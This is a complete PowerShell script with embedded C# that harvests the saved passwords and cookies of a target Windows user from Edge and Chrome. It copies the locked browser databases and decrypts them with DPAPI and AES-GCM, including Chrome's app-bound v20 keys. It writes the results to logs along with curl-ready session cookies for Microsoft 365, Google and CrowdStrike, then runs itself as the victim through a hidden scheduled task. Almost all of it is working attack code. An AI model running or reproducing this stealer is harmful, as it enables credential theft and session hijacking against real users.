# schtask-browser-decrypt.ps1
# Standalone browser password & cookie decryptor - zero external dependency
# Uses winsqlite3.dll (native Win10+) + bcrypt.dll (AES-GCM) + crypt32.dll (DPAPI)
# Supports multi-profile (Default, Profile 1, Profile 2, etc.)
# Usage : .\schtask-browser-decrypt.ps1 -TargetUser "DOMAIN\user" [-OutputDir "C:\Temp"] [-Timeout 60]

param(
    [Parameter(Mandatory)][string]$TargetUser,
    [string]$OutputDir = "C:\Lab\harvest",
    [string]$TaskName = "MaTaskBrowserDecrypt",
    [int]$Timeout = 60
)

New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
icacls $OutputDir /grant "*S-1-1-0:(OI)(CI)F" | Out-Null

foreach ($f in @(
    "browser-decrypt.ps1",
    "browser-passwords.log",
    "browser-cookies.log",
    "browser-cookies-curl.txt",
    "browser-decrypt-debug.log"
)) {
    Remove-Item -Path "$OutputDir\$f" -Force -ErrorAction SilentlyContinue
    New-Item -Path "$OutputDir\$f" -ItemType File -Force | Out-Null
    icacls "$OutputDir\$f" /grant "*S-1-1-0:(F)" | Out-Null
}

# Clean up DB files from previous runs
Get-ChildItem -Path $OutputDir -Filter "*.db" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

Write-Host "[*] Creating browser decrypt script..." -ForegroundColor Cyan

@"
`$outputDir = "$OutputDir"
`$debugLog = "`$outputDir\browser-decrypt-debug.log"

function Log(`$msg) { "[`$(Get-Date -Format 'HH:mm:ss')] `$msg" | Out-File `$debugLog -Append }

Log "=== Browser Decrypt Start ==="

# ============================================================
# 0. COPY LOCKED DB FILES WITH ESENTUTL (multi-profile)
# ============================================================
Log "Copying locked DB files (multi-profile)..."

`$browsers = @(
    @{ Name = "Edge";   Base = "`$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
    @{ Name = "Chrome"; Base = "`$env:LOCALAPPDATA\Google\Chrome\User Data" }
)

foreach (`$b in `$browsers) {
    `$base = `$b.Base
    `$name = `$b.Name
    if (-not (Test-Path `$base)) { Log "`$name not found, skipping"; continue }

    # Enumerate all profile directories (Default, Profile 1, Profile 2, ...)
    `$profiles = Get-ChildItem -Path `$base -Directory | Where-Object { `$_.Name -match '^(Default|Profile)' }

    foreach (`$profile in `$profiles) {
        `$profileName = `$profile.Name -replace ' ', '-'
        `$profilePath = `$profile.FullName
        `$prefix      = `$name.ToLower()

        foreach (`$target in @(
            @{ Src = "`$profilePath\Login Data";      Dst = "`$outputDir\`$prefix-`$profileName-LoginData.db" },
            @{ Src = "`$profilePath\Network\Cookies"; Dst = "`$outputDir\`$prefix-`$profileName-Cookies.db" },
            @{ Src = "`$profilePath\Cookies";          Dst = "`$outputDir\`$prefix-`$profileName-Cookies-legacy.db" }
        )) {
            if (Test-Path `$target.Src) {
                `$copied = `$false
                try {
                    `$null = & esentutl.exe /y `$target.Src /d `$target.Dst /o 2>&1
                    if (Test-Path `$target.Dst) { `$copied = `$true; Log "[+] `$name/`$(`$profile.Name) `$(`$target.Src | Split-Path -Leaf) copied via esentutl" }
                } catch {}
                if (-not `$copied) {
                    try {
                        [System.IO.File]::WriteAllBytes(`$target.Dst, [System.IO.File]::ReadAllBytes(`$target.Src))
                        `$copied = `$true; Log "[+] `$name/`$(`$profile.Name) `$(`$target.Src | Split-Path -Leaf) copied via ReadAllBytes"
                    } catch {}
                }
                if (-not `$copied) {
                    try {
                        Copy-Item `$target.Src `$target.Dst -Force -ErrorAction Stop
                        Log "[+] `$name/`$(`$profile.Name) `$(`$target.Src | Split-Path -Leaf) copied via Copy-Item"
                    } catch { Log "[-] `$name/`$(`$profile.Name) `$(`$target.Src | Split-Path -Leaf) FAILED: `$_" }
                }
            }
        }
    }
}

# ============================================================
# 1. COMPILE C# DECRYPTOR (native DLLs only)
# ============================================================
Log "Compiling C# decryptor..."

Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

public class BrowserDecrypt
{
    // ========== winsqlite3.dll (native Windows 10+) ==========
    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_open")]
    static extern int sqlite3_open(byte[] filename, out IntPtr db);

    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_prepare_v2")]
    static extern int sqlite3_prepare_v2(IntPtr db, byte[] sql, int nBytes, out IntPtr stmt, IntPtr tail);

    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_step")]
    static extern int sqlite3_step(IntPtr stmt);

    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_column_text16")]
    static extern IntPtr sqlite3_column_text16(IntPtr stmt, int col);

    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_column_blob")]
    static extern IntPtr sqlite3_column_blob(IntPtr stmt, int col);

    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_column_bytes")]
    static extern int sqlite3_column_bytes(IntPtr stmt, int col);

    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_column_int64")]
    static extern long sqlite3_column_int64(IntPtr stmt, int col);

    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_column_type")]
    static extern int sqlite3_column_type(IntPtr stmt, int col);

    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_finalize")]
    static extern int sqlite3_finalize(IntPtr stmt);

    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_close")]
    static extern int sqlite3_close(IntPtr db);

    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_errmsg16")]
    static extern IntPtr sqlite3_errmsg16(IntPtr db);

    const int SQLITE_OK = 0;
    const int SQLITE_ROW = 100;

    // ========== crypt32.dll (DPAPI) ==========
    [StructLayout(LayoutKind.Sequential)]
    struct DATA_BLOB
    {
        public int cbData;
        public IntPtr pbData;
    }

    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, StringBuilder desc,
        IntPtr entropy, IntPtr reserved, IntPtr prompt, int flags, ref DATA_BLOB pDataOut);

    [DllImport("kernel32.dll")]
    static extern IntPtr LocalFree(IntPtr hMem);

    // ========== bcrypt.dll (AES-GCM) ==========
    [StructLayout(LayoutKind.Sequential)]
    struct BCRYPT_AUTH_INFO
    {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;
    }

    [DllImport("bcrypt.dll")]
    static extern int BCryptOpenAlgorithmProvider(out IntPtr hAlg,
        [MarshalAs(UnmanagedType.LPWStr)] string algId,
        [MarshalAs(UnmanagedType.LPWStr)] string impl, int flags);

    [DllImport("bcrypt.dll")]
    static extern int BCryptSetProperty(IntPtr hObj,
        [MarshalAs(UnmanagedType.LPWStr)] string prop, byte[] input, int inputLen, int flags);

    [DllImport("bcrypt.dll")]
    static extern int BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr hKey,
        IntPtr keyObj, int keyObjLen, byte[] secret, int secretLen, int flags);

    [DllImport("bcrypt.dll")]
    static extern int BCryptDecrypt(IntPtr hKey, byte[] input, int inputLen,
        ref BCRYPT_AUTH_INFO paddingInfo, byte[] iv, int ivLen,
        byte[] output, int outputLen, out int resultLen, int flags);

    [DllImport("bcrypt.dll")]
    static extern int BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    static extern int BCryptCloseAlgorithmProvider(IntPtr hAlg, int flags);

    // ========== HELPERS ==========

    static string GetSqliteText(IntPtr stmt, int col)
    {
        IntPtr ptr = sqlite3_column_text16(stmt, col);
        if (ptr == IntPtr.Zero) return "";
        return Marshal.PtrToStringUni(ptr);
    }

    static byte[] GetSqliteBlob(IntPtr stmt, int col)
    {
        int len = sqlite3_column_bytes(stmt, col);
        if (len <= 0) return new byte[0];
        IntPtr ptr = sqlite3_column_blob(stmt, col);
        if (ptr == IntPtr.Zero) return new byte[0];
        byte[] buf = new byte[len];
        Marshal.Copy(ptr, buf, 0, len);
        return buf;
    }

    static byte[] DpapiDecrypt(byte[] data)
    {
        DATA_BLOB input = new DATA_BLOB();
        DATA_BLOB output = new DATA_BLOB();
        input.cbData = data.Length;
        input.pbData = Marshal.AllocHGlobal(data.Length);
        Marshal.Copy(data, 0, input.pbData, data.Length);
        try
        {
            if (!CryptUnprotectData(ref input, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref output))
                return null;
            byte[] result = new byte[output.cbData];
            Marshal.Copy(output.pbData, result, 0, output.cbData);
            LocalFree(output.pbData);
            return result;
        }
        finally { Marshal.FreeHGlobal(input.pbData); }
    }

    static byte[] DpapiDecryptMachine(byte[] data)
    {
        DATA_BLOB input = new DATA_BLOB();
        DATA_BLOB output = new DATA_BLOB();
        input.cbData = data.Length;
        input.pbData = Marshal.AllocHGlobal(data.Length);
        Marshal.Copy(data, 0, input.pbData, data.Length);
        try
        {
            // CRYPTPROTECT_LOCAL_MACHINE = 0x04
            if (!CryptUnprotectData(ref input, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x04, ref output))
                return null;
            byte[] result = new byte[output.cbData];
            Marshal.Copy(output.pbData, result, 0, output.cbData);
            LocalFree(output.pbData);
            return result;
        }
        finally { Marshal.FreeHGlobal(input.pbData); }
    }

    static byte[] AesGcmDecrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
    {
        IntPtr hAlg = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        GCHandle noncePin = default(GCHandle);
        GCHandle tagPin = default(GCHandle);

        try
        {
            int status = BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
            if (status != 0) return null;

            byte[] chainMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            status = BCryptSetProperty(hAlg, "ChainingMode", chainMode, chainMode.Length, 0);
            if (status != 0) return null;

            status = BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
            if (status != 0) return null;

            noncePin = GCHandle.Alloc(nonce, GCHandleType.Pinned);
            tagPin = GCHandle.Alloc(tag, GCHandleType.Pinned);

            BCRYPT_AUTH_INFO authInfo = new BCRYPT_AUTH_INFO();
            authInfo.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTH_INFO));
            authInfo.dwInfoVersion = 1;
            authInfo.pbNonce = noncePin.AddrOfPinnedObject();
            authInfo.cbNonce = nonce.Length;
            authInfo.pbTag = tagPin.AddrOfPinnedObject();
            authInfo.cbTag = tag.Length;

            byte[] output = new byte[ciphertext.Length];
            int resultLen;
            status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref authInfo,
                null, 0, output, output.Length, out resultLen, 0);

            if (status != 0) return null;

            byte[] result = new byte[resultLen];
            Array.Copy(output, result, resultLen);
            return result;
        }
        finally
        {
            if (noncePin.IsAllocated) noncePin.Free();
            if (tagPin.IsAllocated) tagPin.Free();
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }

    // Chrome 114+ prepends a 32-byte hash to AES-GCM plaintext.
    // Detect by checking for control characters in first 32 bytes and strip them.
    // Returns the usable portion of the decrypted bytes (after prefix removal).
    static byte[] StripBinaryPrefix(byte[] plain)
    {
        if (plain.Length > 32)
        {
            bool hasBinaryPrefix = false;
            for (int i = 0; i < 32; i++)
            {
                if (plain[i] < 0x20) { hasBinaryPrefix = true; break; }
            }
            if (hasBinaryPrefix)
            {
                byte[] trimmed = new byte[plain.Length - 32];
                Array.Copy(plain, 32, trimmed, 0, trimmed.Length);
                return trimmed;
            }
        }
        return plain;
    }

    static string PlainBytesToString(byte[] plain)
    {
        return Encoding.UTF8.GetString(StripBinaryPrefix(plain));
    }

    static string PlainBytesToBase64(byte[] plain)
    {
        return Convert.ToBase64String(StripBinaryPrefix(plain));
    }

    // ========== KEY EXTRACTION ==========

    static byte[] GetBrowserKey(string localStatePath, StringBuilder log)
    {
        if (!File.Exists(localStatePath)) { log.AppendLine("[WARN] Local State not found: " + localStatePath); return null; }

        string json = File.ReadAllText(localStatePath);
        byte[] v10Key = null;
        byte[] v20Key = null;

        // Extract encrypted_key (for v10 blobs)
        string marker = "\"encrypted_key\":\"";
        int idx = json.IndexOf(marker);
        if (idx >= 0)
        {
            int start = idx + marker.Length;
            int end = json.IndexOf("\"", start);
            if (end > start)
            {
                string b64 = json.Substring(start, end - start);
                try
                {
                    byte[] raw = Convert.FromBase64String(b64);
                    if (raw.Length > 5 && raw[0] == 68 && raw[1] == 80 && raw[2] == 65 && raw[3] == 80 && raw[4] == 73)
                    {
                        byte[] dpapiBlob = new byte[raw.Length - 5];
                        Array.Copy(raw, 5, dpapiBlob, 0, dpapiBlob.Length);
                        v10Key = DpapiDecrypt(dpapiBlob);
                        if (v10Key != null)
                            log.AppendLine("[+] v10 AES key decrypted (" + v10Key.Length + " bytes)");
                        else
                            log.AppendLine("[WARN] v10 key DPAPI decrypt failed");
                    }
                }
                catch (Exception ex) { log.AppendLine("[ERROR] v10 key extraction: " + ex.Message); }
            }
        }

        // Extract app_bound_encrypted_key (for v20 blobs)
        marker = "\"app_bound_encrypted_key\":\"";
        idx = json.IndexOf(marker);
        if (idx >= 0)
        {
            int start = idx + marker.Length;
            int end = json.IndexOf("\"", start);
            if (end > start)
            {
                string b64 = json.Substring(start, end - start);
                try
                {
                    byte[] raw = Convert.FromBase64String(b64);
                    if (raw.Length > 4 && raw[0] == 65 && raw[1] == 80 && raw[2] == 80 && raw[3] == 66)
                    {
                        byte[] appBlob = new byte[raw.Length - 4];
                        Array.Copy(raw, 4, appBlob, 0, appBlob.Length);

                        byte[] intermediate = DpapiDecryptMachine(appBlob);
                        if (intermediate != null)
                        {
                            log.AppendLine("[+] v20 app-bound: machine-level DPAPI OK (" + intermediate.Length + " bytes)");
                            if (intermediate.Length > 1)
                            {
                                byte[] userBlob = new byte[intermediate.Length - 1];
                                Array.Copy(intermediate, 1, userBlob, 0, userBlob.Length);
                                byte[] finalKey = DpapiDecrypt(userBlob);
                                if (finalKey != null)
                                {
                                    if (finalKey.Length >= 32)
                                    {
                                        v20Key = new byte[32];
                                        Array.Copy(finalKey, finalKey.Length - 32, v20Key, 0, 32);
                                        log.AppendLine("[+] v20 AES key decrypted (" + v20Key.Length + " bytes)");
                                    }
                                    else
                                    {
                                        v20Key = finalKey;
                                        log.AppendLine("[+] v20 AES key decrypted (short: " + v20Key.Length + " bytes)");
                                    }
                                }
                                else
                                    log.AppendLine("[WARN] v20 user-level DPAPI failed");
                            }
                        }
                        else
                        {
                            log.AppendLine("[WARN] v20 machine-level DPAPI failed (need admin/SYSTEM)");
                            byte[] fallback = DpapiDecrypt(appBlob);
                            if (fallback != null && fallback.Length >= 32)
                            {
                                v20Key = new byte[32];
                                Array.Copy(fallback, fallback.Length - 32, v20Key, 0, 32);
                                log.AppendLine("[+] v20 key recovered via DPAPI fallback");
                            }
                        }
                    }
                }
                catch (Exception ex) { log.AppendLine("[ERROR] v20 key extraction: " + ex.Message); }
            }
        }
        else
        {
            log.AppendLine("[INFO] No app_bound_encrypted_key (older browser version)");
        }

        byte[] keys = new byte[64];
        if (v10Key != null) Array.Copy(v10Key, 0, keys, 0, Math.Min(v10Key.Length, 32));
        if (v20Key != null) Array.Copy(v20Key, 0, keys, 32, Math.Min(v20Key.Length, 32));
        return keys;
    }

    static string DecryptBrowserBlob(byte[] enc, byte[] v10Key, byte[] v20Key, out string version, bool asBase64 = false)
    {
        version = "unknown";
        if (enc == null || enc.Length < 4) return null;

        string prefix = "";
        if (enc.Length >= 3) prefix = Encoding.ASCII.GetString(enc, 0, 3);

        if (prefix == "v10" || prefix == "v11")
        {
            version = prefix;
            if (v10Key == null) return "[no v10 key]";
            // 3 prefix + 12 nonce + 16 tag = 31 minimum (0-byte ciphertext = empty value)
            if (enc.Length < 3 + 12 + 16) return "[blob too short]";
            if (enc.Length == 3 + 12 + 16) return "";  // empty value
            byte[] nonce = new byte[12];
            Array.Copy(enc, 3, nonce, 0, 12);
            byte[] ciphertext = new byte[enc.Length - 3 - 12 - 16];
            Array.Copy(enc, 15, ciphertext, 0, ciphertext.Length);
            byte[] tag = new byte[16];
            Array.Copy(enc, enc.Length - 16, tag, 0, 16);
            byte[] plain = AesGcmDecrypt(v10Key, nonce, ciphertext, tag);
            if (plain != null) return asBase64 ? PlainBytesToBase64(plain) : PlainBytesToString(plain);
            return "[v10 decrypt failed]";
        }

        if (prefix == "v20")
        {
            version = "v20";
            if (v20Key == null) return "[no v20 key - needs admin]";
            if (enc.Length < 3 + 12 + 16) return "[blob too short]";
            if (enc.Length == 3 + 12 + 16) return "";  // empty value
            byte[] nonce = new byte[12];
            Array.Copy(enc, 3, nonce, 0, 12);
            byte[] ciphertext = new byte[enc.Length - 3 - 12 - 16];
            Array.Copy(enc, 15, ciphertext, 0, ciphertext.Length);
            byte[] tag = new byte[16];
            Array.Copy(enc, enc.Length - 16, tag, 0, 16);
            byte[] plain = AesGcmDecrypt(v20Key, nonce, ciphertext, tag);
            if (plain != null) return asBase64 ? PlainBytesToBase64(plain) : PlainBytesToString(plain);
            return "[v20 decrypt failed]";
        }

        version = "dpapi";
        byte[] decrypted = DpapiDecrypt(enc);
        if (decrypted != null) return asBase64 ? Convert.ToBase64String(decrypted) : Encoding.UTF8.GetString(decrypted);
        return "[legacy DPAPI failed]";
    }

    // ========== MAIN FUNCTIONS ==========

    public static string DumpPasswords(string dbPath, byte[] v10Key, byte[] v20Key)
    {
        StringBuilder sb = new StringBuilder();
        IntPtr db = IntPtr.Zero;

        byte[] pathBytes = Encoding.UTF8.GetBytes(dbPath + "\0");
        int rc = sqlite3_open(pathBytes, out db);
        if (rc != SQLITE_OK)
        {
            sb.AppendLine("[ERROR] Cannot open " + dbPath);
            if (db != IntPtr.Zero) sqlite3_close(db);
            return sb.ToString();
        }

        string sql = "SELECT origin_url, username_value, password_value FROM logins";
        byte[] sqlBytes = Encoding.UTF8.GetBytes(sql + "\0");
        IntPtr stmt = IntPtr.Zero;
        rc = sqlite3_prepare_v2(db, sqlBytes, -1, out stmt, IntPtr.Zero);
        if (rc != SQLITE_OK)
        {
            IntPtr errPtr = sqlite3_errmsg16(db);
            string err = errPtr != IntPtr.Zero ? Marshal.PtrToStringUni(errPtr) : "unknown";
            sb.AppendLine("[ERROR] SQL prepare failed: " + err);
            sqlite3_close(db);
            return sb.ToString();
        }

        int count = 0;
        int decrypted = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW)
        {
            string url = GetSqliteText(stmt, 0);
            string user = GetSqliteText(stmt, 1);
            byte[] enc = GetSqliteBlob(stmt, 2);

            if (enc.Length == 0 && string.IsNullOrEmpty(user)) continue;

            count++;
            string version;
            string password = DecryptBrowserBlob(enc, v10Key, v20Key, out version);

            if (password != null && !password.StartsWith("["))
            {
                decrypted++;
                sb.AppendLine("URL      : " + url);
                sb.AppendLine("Username : " + user);
                sb.AppendLine("Password : " + password);
                sb.AppendLine("Version  : " + version);
                sb.AppendLine("---");
            }
            else
            {
                sb.AppendLine("URL      : " + url);
                sb.AppendLine("Username : " + user);
                sb.AppendLine("Password : " + (password ?? "[null]"));
                sb.AppendLine("Version  : " + version);
                sb.AppendLine("---");
            }
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);

        sb.Insert(0, "[*] Passwords: " + decrypted + "/" + count + " decrypted\n\n");
        return sb.ToString();
    }

    public static string DumpCookies(string dbPath, byte[] v10Key, byte[] v20Key, out string curlCookies, string outputDir, string browserName, string profileName)
    {
        StringBuilder sb = new StringBuilder();
        StringBuilder allSb = new StringBuilder();
        Dictionary<string, string> spCookies = new Dictionary<string, string>();
        curlCookies = "";
        IntPtr db = IntPtr.Zero;

        byte[] pathBytes = Encoding.UTF8.GetBytes(dbPath + "\0");
        int rc = sqlite3_open(pathBytes, out db);
        if (rc != SQLITE_OK)
        {
            sb.AppendLine("[ERROR] Cannot open " + dbPath);
            if (db != IntPtr.Zero) sqlite3_close(db);
            return sb.ToString();
        }

        string sql = "SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies ORDER BY host_key, name";
        byte[] sqlBytes = Encoding.UTF8.GetBytes(sql + "\0");
        IntPtr stmt = IntPtr.Zero;
        rc = sqlite3_prepare_v2(db, sqlBytes, -1, out stmt, IntPtr.Zero);
        if (rc != SQLITE_OK)
        {
            sb.AppendLine("[WARN] Standard cookies table failed, trying alternate schema...");
            sql = "SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies";
            sqlBytes = Encoding.UTF8.GetBytes(sql + "\0");
            rc = sqlite3_prepare_v2(db, sqlBytes, -1, out stmt, IntPtr.Zero);
            if (rc != SQLITE_OK)
            {
                IntPtr errPtr = sqlite3_errmsg16(db);
                string err = errPtr != IntPtr.Zero ? Marshal.PtrToStringUni(errPtr) : "unknown";
                sb.AppendLine("[ERROR] SQL prepare failed: " + err);
                sqlite3_close(db);
                return sb.ToString();
            }
        }

        int count = 0;
        int decrypted = 0;
        int displayed = 0;

        // All cookies are decrypted; only these domains are shown in the output
        string[] interestingDomains = new string[] {
            "sharepoint.com", "microsoft.com", "microsoftonline.com",
            "office.com", "office365.com", "live.com", "azure.com",
            "onedrive.com", "teams.microsoft.com",
            "google.com", "google.fr", "youtube.com", "googleapis.com",
            "crowdstrike.com"
        };

        // Header for all-cookies file
        allSb.AppendLine("[*] ALL Cookies - " + browserName + " [" + profileName + "]");
        allSb.AppendLine("[*] Dump time: " + DateTime.Now.ToString());
        allSb.AppendLine("[*] User: " + Environment.UserDomainName + "\\" + Environment.UserName);
        allSb.AppendLine("");

        while (sqlite3_step(stmt) == SQLITE_ROW)
        {
            string host = GetSqliteText(stmt, 0);
            string name = GetSqliteText(stmt, 1);
            byte[] enc = GetSqliteBlob(stmt, 2);
            string path = GetSqliteText(stmt, 3);
            long expires = sqlite3_column_int64(stmt, 4);

            if (enc.Length == 0) continue;
            count++;

            string version;
            string value = DecryptBrowserBlob(enc, v10Key, v20Key, out version, true);
            bool ok = (value != null && !value.StartsWith("["));
            if (ok) decrypted++;

            // Write ALL decrypted cookies to the all-cookies file
            if (ok)
            {
                allSb.AppendLine("Host     : " + host);
                allSb.AppendLine("Name     : " + name);
                allSb.AppendLine("Value    : " + value);
                allSb.AppendLine("Path     : " + path);
                allSb.AppendLine("Version  : " + version);
                allSb.AppendLine("---");
            }

            // Display filter: only show interesting domains
            bool interesting = false;
            foreach (string d in interestingDomains)
            {
                if (host.Contains(d)) { interesting = true; break; }
            }

            if (interesting && ok)
            {
                displayed++;
                sb.AppendLine("Host     : " + host);
                sb.AppendLine("Name     : " + name);
                sb.AppendLine("Value    : " + value);
                sb.AppendLine("Path     : " + path);
                sb.AppendLine("Version  : " + version);
                sb.AppendLine("---");

                string cookieKey = host + "|" + name;
                if (!spCookies.ContainsKey(cookieKey))
                    spCookies[cookieKey] = name + "=" + value;
            }
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);

        sb.Insert(0, "[*] Cookies: " + decrypted + "/" + count + " decrypted total, " + displayed + " interesting shown\n\n");
        allSb.AppendLine("");
        allSb.AppendLine("[*] Total: " + decrypted + "/" + count + " decrypted");

        // Write all-cookies file
        string allCookiesFile = Path.Combine(outputDir, "all-cookies-" + browserName.ToLower() + "-" + profileName + ".log");
        File.WriteAllText(allCookiesFile, allSb.ToString());

        // Build curl cookie string from interesting domains
        if (spCookies.Count > 0)
        {
            StringBuilder curl = new StringBuilder();
            foreach (var kv in spCookies)
            {
                if (curl.Length > 0) curl.Append("; ");
                curl.Append(kv.Value);
            }
            curlCookies = curl.ToString();
        }

        return sb.ToString();
    }

    // ========== ENTRY POINT ==========
    public static string Run(string outputDir)
    {
        StringBuilder log = new StringBuilder();
        log.AppendLine("=== BrowserDecrypt Run ===");
        log.AppendLine("Time: " + DateTime.Now.ToString());
        log.AppendLine("User: " + Environment.UserName);
        log.AppendLine("");

        string[] browserNames = new string[] { "Edge", "Chrome" };
        string[] localStates = new string[] {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "User Data", "Local State"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Local State")
        };
        string[] prefixes = new string[] { "edge", "chrome" };

        StringBuilder allPasswords = new StringBuilder();
        StringBuilder allCookies = new StringBuilder();
        StringBuilder allCurl = new StringBuilder();

        allPasswords.AppendLine("[*] Browser Password Dump - " + DateTime.Now.ToString());
        allPasswords.AppendLine("[*] User: " + Environment.UserDomainName + "\\" + Environment.UserName);
        allPasswords.AppendLine("");

        allCookies.AppendLine("[*] Browser Cookie Dump - " + DateTime.Now.ToString());
        allCookies.AppendLine("[*] User: " + Environment.UserDomainName + "\\" + Environment.UserName);
        allCookies.AppendLine("");

        for (int b = 0; b < browserNames.Length; b++)
        {
            string bName = browserNames[b];
            string localState = localStates[b];
            string pre = prefixes[b];

            log.AppendLine("--- " + bName + " ---");

            if (!File.Exists(localState))
            {
                log.AppendLine("[SKIP] " + bName + " not installed");
                continue;
            }

            // Get keys
            byte[] keys = GetBrowserKey(localState, log);
            byte[] v10Key = null;
            byte[] v20Key = null;

            if (keys != null)
            {
                bool hasV10 = false;
                for (int i = 0; i < 32; i++) { if (keys[i] != 0) { hasV10 = true; break; } }
                if (hasV10) { v10Key = new byte[32]; Array.Copy(keys, 0, v10Key, 0, 32); }

                bool hasV20 = false;
                for (int i = 32; i < 64; i++) { if (keys[i] != 0) { hasV20 = true; break; } }
                if (hasV20) { v20Key = new byte[32]; Array.Copy(keys, 32, v20Key, 0, 32); }
            }

            log.AppendLine("v10 key: " + (v10Key != null ? "OK" : "NONE"));
            log.AppendLine("v20 key: " + (v20Key != null ? "OK" : "NONE"));

            // ---- Multi-profile: discover all profiles from DB filenames ----
            string searchPrefix = pre + "-";
            string[] dbSuffixes = new string[] { "-LoginData.db", "-Cookies.db", "-Cookies-legacy.db" };
            HashSet<string> profileNames = new HashSet<string>();

            string[] allDbFiles = Directory.GetFiles(outputDir, pre + "-*.db");
            foreach (string f in allDbFiles)
            {
                string fname = Path.GetFileName(f);
                if (!fname.StartsWith(searchPrefix)) continue;
                string rest = fname.Substring(searchPrefix.Length);
                foreach (string suffix in dbSuffixes)
                {
                    if (rest.EndsWith(suffix, StringComparison.OrdinalIgnoreCase))
                    {
                        string profile = rest.Substring(0, rest.Length - suffix.Length);
                        if (profile.Length > 0) profileNames.Add(profile);
                        break;
                    }
                }
            }

            if (profileNames.Count == 0)
            {
                allPasswords.AppendLine("========== " + bName + " ==========");
                allPasswords.AppendLine("[SKIP] No profile DBs found");
                allPasswords.AppendLine("");
                allCookies.AppendLine("========== " + bName + " ==========");
                allCookies.AppendLine("[SKIP] No profile DBs found");
                allCookies.AppendLine("");
                continue;
            }

            log.AppendLine("[*] Found " + profileNames.Count + " profile(s)");

            List<string> sortedProfiles = new List<string>(profileNames);
            sortedProfiles.Sort();

            foreach (string profile in sortedProfiles)
            {
                log.AppendLine("  Processing profile: " + profile);

                // Passwords
                string loginDb = Path.Combine(outputDir, pre + "-" + profile + "-LoginData.db");
                if (File.Exists(loginDb))
                {
                    allPasswords.AppendLine("========== " + bName + " [" + profile + "] ==========");
                    allPasswords.AppendLine(DumpPasswords(loginDb, v10Key, v20Key));
                }

                // Cookies (prefer non-legacy, fallback to legacy)
                string cookieDb = Path.Combine(outputDir, pre + "-" + profile + "-Cookies.db");
                if (!File.Exists(cookieDb))
                    cookieDb = Path.Combine(outputDir, pre + "-" + profile + "-Cookies-legacy.db");

                if (File.Exists(cookieDb))
                {
                    string curlStr;
                    allCookies.AppendLine("========== " + bName + " [" + profile + "] ==========");
                    allCookies.AppendLine(DumpCookies(cookieDb, v10Key, v20Key, out curlStr, outputDir, bName, profile));
                    if (!string.IsNullOrEmpty(curlStr))
                    {
                        allCurl.AppendLine("# " + bName + " [" + profile + "] cookies for curl:");
                        allCurl.AppendLine(curlStr);
                        allCurl.AppendLine("");
                    }
                }
            }
        }

        // Write output files
        File.WriteAllText(Path.Combine(outputDir, "browser-passwords.log"), allPasswords.ToString());
        File.WriteAllText(Path.Combine(outputDir, "browser-cookies.log"), allCookies.ToString());
        if (allCurl.Length > 0)
            File.WriteAllText(Path.Combine(outputDir, "browser-cookies-curl.txt"), allCurl.ToString());

        return log.ToString();
    }
}
'@ -Language CSharp

# ============================================================
# 2. RUN DECRYPTOR
# ============================================================
Log "Running decryptor..."
try {
    `$result = [BrowserDecrypt]::Run(`$outputDir)
    `$result | Out-File `$debugLog -Append
    Log "=== Done ==="
} catch {
    Log "[FATAL] `$_"
    Log `$_.ScriptStackTrace
}
"@ | Set-Content -Path "$OutputDir\browser-decrypt.ps1" -Encoding UTF8
icacls "$OutputDir\browser-decrypt.ps1" /grant "*S-1-1-0:(F)" | Out-Null

Write-Host "[*] Creating and starting scheduled task as $TargetUser..." -ForegroundColor Cyan
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
$settings  = New-ScheduledTaskSettingsSet -Hidden
$action    = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $OutputDir\browser-decrypt.ps1" `
    -WorkingDirectory $OutputDir
$principal = New-ScheduledTaskPrincipal -UserId $TargetUser -LogonType Interactive -RunLevel Limited
Register-ScheduledTask -TaskName $TaskName -Action $action -Principal $principal -Settings $settings -Force | Out-Null
Start-ScheduledTask -TaskName $TaskName

